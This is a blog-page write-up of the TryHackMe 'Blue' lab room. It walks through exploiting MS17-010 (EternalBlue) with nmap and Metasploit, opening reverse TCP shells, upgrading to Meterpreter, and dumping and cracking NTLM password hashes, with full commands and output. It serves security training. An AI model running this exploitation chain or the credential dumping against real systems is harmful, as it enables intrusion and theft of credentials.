---
layout: page
title: THM Blue
description: Blue from TryHackMe.
img: 
importance: 4
category: TryHackMe
related_publications: false
---

<div class="row justify-content-sm-center">
    <div class="col-sm-4 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="assets/img/blue/blue.gif" title="THM Blue Logo" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<h2>Link</h2>
<a href="https://tryhackme.com/r/room/blue">Room Link</a>

<br/>
<h2>Process</h2>

<br/>
Here we go with an old vulnerability from 2017.

As per the usual, start off with an nmap to scan the IP address for the open ports.

{% raw %}
```bash
┌──(sec㉿kali)-[~]
└─$ nmap -sV -sC -A -O --script vuln -oN nmap 10.10.18.22 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-07 00:51 AEDT
Nmap scan report for 10.10.18.22
Host is up (0.27s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)

<snip>

Host script results:
|_smb-vuln-ms10-054: false
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED

<snip>

```
{% endraw %}

<br />
Notice the vuln scripts says this machine is vulnerable to MS17-010.  Read the <a href="https://learn.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010">Microsoft Security Bulletin</a> if it interests you.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="assets/img/blue/bulletin.png" title="Microsoft Security Bulletin" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Start msfvenom and use the q option to supress the ascii art.

{% raw %}
```bash
┌──(sec㉿kali)-[~]
└─$ msfconsole -q                                                                                                      
msf6 > 
```
{% endraw %}

<br />
Search msfconsole for the ms17-010 exploit.

{% raw %}
```bash
msf6 > search ms17-010

Matching Modules
================

   #   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1     \_ target: Automatic Target                  .                .        .      .
   2     \_ target: Windows 7                         .                .        .      .
   3     \_ target: Windows Embedded Standard 7       .                .        .      .
   4     \_ target: Windows Server 2008 R2            .                .        .      .
   5     \_ target: Windows 8                         .                .        .      .
   6     \_ target: Windows 8.1                       .                .        .      .
   7     \_ target: Windows Server 2012               .                .        .      .
   8     \_ target: Windows 10 Pro                    .                .        .      .
   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .
   10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   11    \_ target: Automatic                         .                .        .      .
   12    \_ target: PowerShell                        .                .        .      .
   13    \_ target: Native upload                     .                .        .      .
   14    \_ target: MOF upload                        .                .        .      .
   15    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   16    \_ AKA: ETERNALROMANCE                       .                .        .      .
   17    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   18    \_ AKA: ETERNALBLUE                          .                .        .      .
   19  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   20    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   21    \_ AKA: ETERNALROMANCE                       .                .        .      .
   22    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   23    \_ AKA: ETERNALBLUE                          .                .        .      .
   24  auxiliary/scanner/smb/smb_ms17_010             .                normal   No     MS17-010 SMB RCE Detection
   25    \_ AKA: DOUBLEPULSAR                         .                .        .      .
   26    \_ AKA: ETERNALBLUE                          .                .        .      .
   27  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
   28    \_ target: Execute payload (x64)             .                .        .      .
   29    \_ target: Neutralize implant                .                .        .      .


Interact with a module by name or index. For example info 29, use 29 or use exploit/windows/smb/smb_doublepulsar_rce
After interacting with a module you can manually set a TARGET with set TARGET 'Neutralize implant'
```
{% endraw %}

<br />
Choose to use the payload at the top of the list.

{% raw %}
```bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```
{% endraw %}

<br />
Use the show options command to view the options for this payload.

{% raw %}
```bash
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.
```
{% endraw %}

<br />
Set the RHOSTS because it is a require option.  Plus, the exploit will need to know it to know what to attack.

{% raw %}
```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.18.22
RHOSTS => 10.10.18.22
```
{% endraw %}

<br />
Set LHOST to the IP on the tun0 interface.

{% raw %}
```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST tun0
LHOST => 10.4.119.29
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST tun0
LHOST => 10.4.119.29
```
{% endraw %}

<br />
Set the payload to a staged, x64 shell payload.  This is for practice purposes.

{% raw %}
```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/shell/reverse_tcp
PAYLOAD => windows/x64/shell/reverse_tcp
```
{% endraw %}

<br />
Use exploit to run the command.

{% raw %}
```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on 10.4.119.29:4444 
[*] 10.10.18.22:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.18.22:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)

<snip>

[*] Sending stage (336 bytes) to 10.10.18.22
[*] Command shell session 1 opened (10.4.119.29:4444 -> 10.10.18.22:49203) at 2025-01-07 01:08:27 +1100
[+] 10.10.18.22:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.18.22:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.18.22:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


Shell Banner:
Microsoft Windows [Version 6.1.7601]
-----
          

C:\Windows\system32>
```
{% endraw %}

<br />
Use control + z to background the session.

{% raw %}
```bash
C:\Windows\system32>^Z
Background session 1? [y/N]  y
msf6 exploit(windows/smb/ms17_010_eternalblue) > 
```
{% endraw %}

<br />
Search for shell_to_meterpreter to find a way to upgrade our shell to meterpreter.

{% raw %}
```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > search shell_to_meterpreter

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  post/multi/manage/shell_to_meterpreter  .                normal  No     Shell to Meterpreter Upgrade


Interact with a module by name or index. For example info 0, use 0 or use post/multi/manage/shell_to_meterpreter
```
{% endraw %}

<br />
Use the use command to use the exploit discovered in the search.

{% raw %}
```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > use post/multi/manage/shell_to_meterpreter
msf6 post(multi/manage/shell_to_meterpreter) >
```
{% endraw %}

<br />
Show the options for this exploit to discover what options are required.

{% raw %}
```bash
msf6 post(multi/manage/shell_to_meterpreter) > show options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on


View the full module info with the info, or info -d command.
```
{% endraw %}

<br />
Set LHOST to the IP on the tun0 interface.

{% raw %}
```bash
msf6 post(multi/manage/shell_to_meterpreter) > set LHOST tun0
LHOST => 10.4.119.29
msf6 post(multi/manage/shell_to_meterpreter) > set LHOST tun0
LHOST => 10.4.119.29
```
{% endraw %}

<br />
Use sessions to get a list of the Active seesions for this metasploit run.

{% raw %}
```bash
msf6 post(multi/manage/shell_to_meterpreter) > sessions

Active sessions
===============

  Id  Name  Type               Information                                               Connection
  --  ----  ----               -----------                                               ----------
  1         shell x64/windows  Shell Banner: Microsoft Windows [Version 6.1.7601] -----  10.4.119.29:4444 -> 10.10.18.22:49203 (10.10.18.22)
```
{% endraw %}

<br />
Set the SESSION to the session from the shell that was caught earlier.

{% raw %}
```bash
msf6 post(multi/manage/shell_to_meterpreter) > set SESSION 1
SESSION => 1
```
{% endraw %}

<br />
Run the exploit and see if you start another session with meterpreter.

{% raw %}
```bash
msf6 post(multi/manage/shell_to_meterpreter) > exploit

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.4.119.29:4433 
[*] Post module execution completed
```
{% endraw %}

<br />
If this does not work, reexploit the machine from the beginning.

{% raw %}
```bash
msf6 post(multi/manage/shell_to_meterpreter) > exploit

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.4.119.29:4433 
[*] Post module execution completed
msf6 post(multi/manage/shell_to_meterpreter) > 
[*] Sending stage (203846 bytes) to 10.10.18.22
[*] Meterpreter session 2 opened (10.4.119.29:4433 -> 10.10.18.22:49226) at 2025-01-07 01:28:03 +1100
[*] Stopping exploit/multi/handler
sessions -i 2
[*] Starting interaction with 2...

meterpreter >
```
{% endraw %}

<br />
Run the getsystem command to ensure that we are running as SYSTEM.

{% raw %}
```bash
meterpreter > getsystem
[-] Already running as SYSTEM
```
{% endraw %}

<br />
Just because the user is SYsTEM, does not mean that the process we are running as is.  So, run the ps command to get a list of running processes.

{% raw %}
```bash
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]

<snip>

 1288  700   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe

 <snip>

 meterpreter >
```
{% endraw %}

<br />
Choose a process that is running as NT AUTHORITY\SYSTEM.  Migrate to this process using the PID.  If this doesn't work, reboot the machine and start over...again.

{% raw %}
```bash
meterpreter > migrate 1288
[*] Migrating from 1840 to 1288...
[*] Migration completed successfully.
```
{% endraw %}

<br />
Run the hashdump command to get a list of the hashes.

{% raw %}
```bash
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```
{% endraw %}

<br />
Use john the ripper to crack the dumped permission.

{% raw %}
```bash
┌──(sec㉿kali)-[~]
└─$ john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt ntlmpass2 
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (NT [MD4 256/256 AVX2 8x3])
Remaining 1 password hash
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
alqfna22         (?)     
1g 0:00:00:00 DONE (2025-01-07 02:40) 1.369g/s 13973Kp/s 13973Kc/s 13973KC/s alr19882006..alpusidi
Warning: passwords printed above might not be all those cracked
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed.
```
{% endraw %}

<br />
Get the first flag.

{% raw %}
```bash
C:\Windows\system32>cd C:\
cd C:\

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is E611-0B66

 Directory of C:\

03/17/2019  01:27 PM                24 flag1.txt
07/13/2009  09:20 PM    <DIR>          PerfLogs
04/12/2011  02:28 AM    <DIR>          Program Files
03/17/2019  04:28 PM    <DIR>          Program Files (x86)
12/12/2018  09:13 PM    <DIR>          Users
03/17/2019  04:36 PM    <DIR>          Windows
               1 File(s)             24 bytes
               5 Dir(s)  20,609,130,496 bytes free

C:\>type flag1.txt
type flag1.txt
<redacted>
C:\>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Local Area Connection 2:

   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
   Link-local IPv6 Address . . . . . : fe80::6c94:e151:3cf1:95fd%14
   IPv4 Address. . . . . . . . . . . : 10.10.188.119
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.10.0.1

Tunnel adapter isatap.eu-west-1.compute.internal:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
```
{% endraw %}

<br />
Get the second flag.

{% raw %}
```bash
C:\>cd C:\Windows\system32\config
cd C:\Windows\system32\config

C:\Windows\System32\config>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is E611-0B66

 Directory of C:\Windows\System32\config

01/06/2025  09:08 AM    <DIR>          .
01/06/2025  09:08 AM    <DIR>          ..
12/12/2018  05:00 PM            28,672 BCD-Template
01/06/2025  09:18 AM        18,087,936 COMPONENTS
01/06/2025  09:26 AM           262,144 DEFAULT
03/17/2019  01:32 PM                34 flag2.txt
07/13/2009  08:34 PM    <DIR>          Journal
01/06/2025  09:26 AM    <DIR>          RegBack
03/17/2019  02:05 PM           262,144 SAM
01/06/2025  09:18 AM           262,144 SECURITY
01/06/2025  09:33 AM        40,632,320 SOFTWARE
01/06/2025  09:34 AM        12,582,912 SYSTEM
11/20/2010  08:41 PM    <DIR>          systemprofile
12/12/2018  05:03 PM    <DIR>          TxR
               8 File(s)     72,118,306 bytes
               6 Dir(s)  20,609,130,496 bytes free

C:\Windows\System32\config>type flag2.txt
type flag2.txt
<redacted>
C:\Windows\System32\config>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Local Area Connection 2:

   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
   Link-local IPv6 Address . . . . . : fe80::6c94:e151:3cf1:95fd%14
   IPv4 Address. . . . . . . . . . . : 10.10.188.119
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.10.0.1

Tunnel adapter isatap.eu-west-1.compute.internal:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : eu-west-1.compute.internal

C:\Windows\System32\config>
```
{% endraw %}

<br />
Use dir to find the third flag.

{% raw %}
```bash
C:\Users>cd C:\
cd C:\

C:\>dir /s *flag*
dir /s *flag*
 Volume in drive C has no label.
 Volume Serial Number is E611-0B66

 Directory of C:\

03/17/2019  01:27 PM                24 flag1.txt
               1 File(s)             24 bytes

 Directory of C:\Users\Jon\AppData\Roaming\Microsoft\Windows\Recent

03/17/2019  01:26 PM               482 flag1.lnk
03/17/2019  01:30 PM               848 flag2.lnk
03/17/2019  01:32 PM             2,344 flag3.lnk
               3 File(s)          3,674 bytes

 Directory of C:\Users\Jon\Documents

03/17/2019  01:26 PM                37 flag3.txt
               1 File(s)             37 bytes

 Directory of C:\Windows\System32\config

03/17/2019  01:32 PM                34 flag2.txt
               1 File(s)             34 bytes
```
{% endraw %}

<br />
Get the third flag.

{% raw %}
```bash
C:\Windows\system32>type C:\Users\Jon\Documents\flag3.txt
type C:\Users\Jon\Documents\flag3.txt
<redacted>
C:\Windows\system32>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Local Area Connection 2:

   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
   Link-local IPv6 Address . . . . . : fe80::3dff:fa5:e2bf:24a8%14
   IPv4 Address. . . . . . . . . . . : 10.10.132.199
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.10.0.1

Tunnel adapter isatap.eu-west-1.compute.internal:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
```
{% endraw %}

<br />
And with that, another box down.  Feel free to check out another write-up.